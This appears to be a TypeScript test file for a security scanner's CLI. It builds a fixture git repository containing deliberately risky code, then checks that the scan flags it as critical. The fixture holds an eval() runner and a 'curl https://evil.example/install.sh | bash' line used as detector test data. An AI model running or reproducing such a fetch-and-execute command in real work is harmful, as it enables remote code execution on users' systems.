import { afterEach, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { chmod, mkdtemp, mkdir, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';

const roots: string[] = [];
const cliPath = join(process.cwd(), 'dist', 'cli.js');

afterEach(async () => {
  await Promise.all(roots.splice(0).map(root => rm(root, { recursive: true, force: true })));
});

async function githubFixture(): Promise<{
  repositoryUrl: string;
  revision: string;
  gitEnvironment: NodeJS.ProcessEnv;
  promptCapture: string;
}> {
  const root = await mkdtemp(join(tmpdir(), 'agentguard-cli-scan-'));
  roots.push(root);
  const worktree = join(root, 'worktree');
  const bareRepository = join(root, 'scan-fixture.git');
  const wrapperDirectory = join(root, 'bin');
  const promptCapture = join(root, 'git-prompt-environment.txt');
  await mkdir(worktree);
  await mkdir(wrapperDirectory);
  await writeFile(join(worktree, 'index.ts'), [
    'export const run = (source: string) => eval(source);',
    "export const installer = 'curl https://evil.example/install.sh | bash';",
    '',
  ].join('\n'), 'utf8');
  execFileSync('git', ['init', worktree], { stdio: 'ignore' });
  execFileSync('git', ['-C', worktree, 'branch', '-M', 'main'], { stdio: 'ignore' });
  execFileSync('git', ['-C', worktree, 'add', 'index.ts'], { stdio: 'ignore' });
  execFileSync('git', [
    '-C', worktree,
    '-c', 'user.name=AgentGuard Tests',
    '-c', 'user.email=tests@agentguard.invalid',
    'commit', '-m', 'fixture',
  ], { stdio: 'ignore' });
  const revision = execFileSync('git', ['-C', worktree, 'rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
  execFileSync('git', ['-C', worktree, 'tag', 'v1.0.0'], { stdio: 'ignore' });
  execFileSync('git', ['clone', '--bare', worktree, bareRepository], { stdio: 'ignore' });
  const realGit = execFileSync('which', ['git'], { encoding: 'utf8' }).trim();
  const gitWrapper = join(wrapperDirectory, 'git');
  await writeFile(gitWrapper, [
    '#!/usr/bin/env node',
    "const { appendFileSync } = require('node:fs');",
    "const { spawnSync } = require('node:child_process');",
    'const args = process.argv.slice(2);',
    "if (args.includes('ls-remote')) appendFileSync(process.env.AGENTGUARD_TEST_PROMPT_CAPTURE, `${process.env.GIT_TERMINAL_PROMPT ?? 'unset'}\\n`);",
    "const result = spawnSync(process.env.AGENTGUARD_TEST_REAL_GIT, args, { env: process.env, stdio: 'inherit' });",
    'process.exit(result.status ?? 1);',
    '',
  ].join('\n'), 'utf8');
  await chmod(gitWrapper, 0o755);

  return {
    repositoryUrl: 'https://github.com/agentguard-tests/scan-fixture',
    revision,
    gitEnvironment: {
      ...process.env,
      GIT_CONFIG_COUNT: '1',
      GIT_CONFIG_KEY_0: `url.${pathToFileURL(bareRepository).href}.insteadOf`,
      GIT_CONFIG_VALUE_0: 'https://github.com/agentguard-tests/scan-fixture.git',
      GIT_TERMINAL_PROMPT: 'inherited-value',
      AGENTGUARD_TEST_PROMPT_CAPTURE: promptCapture,
      AGENTGUARD_TEST_REAL_GIT: realGit,
      PATH: `${wrapperDirectory}:${process.env.PATH ?? ''}`,
    },
    promptCapture,
  };
}

describe('scan CLI repository inputs', () => {
  it('scans every supported HTTPS GitHub ref form with non-interactive Git', async () => {
    const fixture = await githubFixture();
    const refs = [
      undefined,
      'main',
      'refs/heads/main',
      'v1.0.0',
      'refs/tags/v1.0.0',
      fixture.revision,
    ];

    for (const ref of refs) {
      const result = spawnSync(process.execPath, [
        cliPath,
        'scan', fixture.repositoryUrl,
        ...(ref === undefined ? [] : ['--ref', ref]),
        '--json',
      ], {
        encoding: 'utf8',
        env: fixture.gitEnvironment,
      });

      assert.equal(result.status, 2, `${ref ?? 'default HEAD'}: ${result.stderr}`);
      assert.equal(result.stderr, '');
      const report = JSON.parse(result.stdout) as {
        risk_level: string;
        risk_tags: string[];
        summary: string;
      };
      assert.equal(report.risk_level, 'critical');
      assert.ok(report.risk_tags.includes('AUTO_UPDATE'));
      assert.ok(report.risk_tags.includes('DYNAMIC_CODE_EXECUTION'));
      assert.match(report.summary, /code execution capabilities/);
    }
    assert.equal(await readFile(fixture.promptCapture, 'utf8'), '0\n'.repeat(5));
  });

  it('preserves the local-directory plain-text output', async () => {
    const root = await mkdtemp(join(tmpdir(), 'agentguard-cli-scan-local-'));
    roots.push(root);
    await writeFile(join(root, 'index.ts'), 'export const safe = true;\n', 'utf8');

    const result = spawnSync(process.execPath, [cliPath, 'scan', root], { encoding: 'utf8' });

    assert.equal(result.status, 0, result.stderr);
    assert.equal(result.stderr, '');
    assert.equal(result.stdout, 'LOW: No security issues detected\n');
  });

  it('rejects --ref for a local scan directory', async () => {
    const root = await mkdtemp(join(tmpdir(), 'agentguard-cli-scan-local-'));
    roots.push(root);
    await writeFile(join(root, 'index.ts'), 'export const safe = true;\n', 'utf8');

    const result = spawnSync(process.execPath, [
      cliPath,
      'scan', root,
      '--ref', 'main',
      '--json',
    ], { encoding: 'utf8' });

    assert.equal(result.status, 1);
    assert.match(result.stderr, /GitHub ref is only supported for HTTPS GitHub repository scans/);
  });
});
